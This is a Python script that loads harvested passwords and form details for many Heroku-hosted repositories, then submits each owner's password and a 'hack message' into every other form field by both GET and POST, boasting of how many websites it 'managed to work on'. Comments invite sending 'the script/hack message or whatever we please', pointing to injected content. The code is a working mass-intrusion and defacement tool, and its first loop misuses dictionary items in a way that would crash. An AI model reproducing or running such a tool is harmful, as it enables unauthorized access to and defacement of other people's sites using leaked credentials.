import json
import requests

parsedJSON = 'parsed.json'
dataParsedJson = {}
count = 0
# Loading JSON data.
try:
    with open(parsedJSON) as json_file:
        dataParsedJson = json.load(json_file)

        # We need to send get request to every link in order to make heroku load them.
        # So we can send the data to all websites at once!
        for repoData in dataParsedJson.items():
            try:
                if repoData['pageLink'] != '':
                    requests.get(repoData['pageLink'], timeout=5)
            except requests.exceptions.ReadTimeout as e:
                print(e)

        # Going over every key value pair
        for repo, repoData in dataParsedJson.items():

            print('\n')

            # Gathering data from parsed.json
            # Checking if the keys do exist or not.
            try:
                password = repoData['password']
            except KeyError:
                print('Could not find the password of', repo)
                # Goes to the next iteration of for loop
                continue

            try:
                pageLink = repoData['pageLink']
            except KeyError:
                print('Could not find the form element of', repo)
                continue

            try:
                action = repoData['action']
            except KeyError:
                print('Could not find the form element of', repo)
                continue

            try:
                passField = repoData['passField']
                fields = repoData['fields']
            except KeyError:
                print('Could not find the pass field of', repo)
                continue

            if password != '' and pageLink != '':
                print('Working on {} ( ͡° ͜ʖ ͡°)'.format(repo))
                # Sets up a parameter that we'll use in post or get method.
                # passField is the name of the password input password is the password of the repo owner.
                parameters = {passField: password}

                # For anything other than password input we'll send the script/hack message or whatever we please.
                hackMessage = 'XDDDDD'
                for field in fields:
                    parameters[field] = hackMessage

                # Since we did not check if the repo owners using got or post method we'll send both.
                # If you are going to send a loaded text message it is better to disable get method.
                # Because URLs do have a limitation in length.
                try:
                    responseGet = requests.get((pageLink + action), params=parameters, timeout=10)
                    responsePost = requests.post((pageLink + action), data=parameters, timeout=10)
                    count += 1

                except requests.exceptions.ReadTimeout:
                    # This error occurs since heroku takes to much time to boot up.
                    print('ReadTimeout Error occurred while working on', repo)
                    count -= 1
                except:
                    print('Another error!', repo)
            else:
                print('Can\'t work on ', repo)

except FileNotFoundError:
    exitCode = '''\"{}\" was not found.
    Have you run the following command\:
    python3 parse.py'''.format(parsedJSON)
    exit(exitCode)

print('Managed to work on {} websites!'.format(count))